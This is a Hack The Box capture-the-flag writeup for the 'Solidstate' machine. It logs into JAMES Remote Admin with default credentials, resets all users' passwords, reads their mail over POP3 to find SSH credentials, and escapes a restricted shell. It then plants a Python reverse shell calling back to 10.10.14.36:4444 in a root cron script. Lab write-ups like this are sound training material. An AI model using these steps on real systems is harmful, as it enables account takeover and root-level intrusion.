---
title: "Solidstate"
description: "Writeup for Solidstate machine from HTB"
date: 2020-08-10
author: "Pablo Jesús González Rubio"
cover: "solidstate.png"
coverAlt: "Solidstate icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

Hosts: `10.10.10.51 solidstate.htb`

Nmap output:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.14.36 [10.10.14.36]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Trying a `telnet solidstate.htb 4555`, as 4555 is the oddest port:

{{<img "james.png" >}}

James Administration Tool has default passwords `root`:`root` and it let us in (here the importance of changing default passwords).

Using `HELP` to list available commands:

```
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

I execute `listusers` command:

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Resetting the passwords to have easy access for later:

```
$ setpassword james james
Password for james reset
$ setpassword thomas thomas
Password for thomas reset
$ setpassword john john
Password for john reset
$ setpassword mindy mindy
Password for mindy reset
$ setpassword mailadmin mailadmin
Password for mailadmin reset
```

I then begin listing mails from within the [POP3 port (110)](https://nonuser.es/posts/port_cheatsheet/#110---pop3) with:

```
telnet solidstate.htb 110
# USER james
# PASS james
# LIST
# RETR 1
# QUIT
# ...
```

Nothing on James nor Thomas.

On John:

{{<img "john.png" >}}

It says Mindy has a temporary password, let's investigate his emails.

Mindy's 1º email:

{{<img "1email.png" >}}

Mindy's 2º email:

{{<img "2email.png" >}}

So we got credentials:

```
username: mindy
pass: P@55W0rd1!2@
```

Et voilá!

{{<img "ssh.png" >}}

## Privilege Escalation

### Root

When I try to `cd` to other directories it doesn't let us, it's a restricted shell. To bypass this we quit the ssh session and run the ssh again with the command `bash` like this:

```
ssh mindy@solidstate.htb bash
```

And then the [TTY procedure](https://nonuser.es/posts/pentest_cheatsheet/#tty).

I [uploaded](/posts/data_exfiltration) `linenum` but didn't find anything interesting, so I continued and uploaded `pspy` to check crons and this appears:

{{<img "crons.png" >}}

So `root` is running a python script and I have full access to the file:

{{<img "tmp.png" >}}

So the idea is to put a reverse shell inside the script and when the cron runs again, we'll have a connection.

My reverse is:

```python
#!/usr/bin/env python
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.36",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```

Listening with `nc -lnvp 4444` and... got `root` access!

{{<img "root.png" >}}
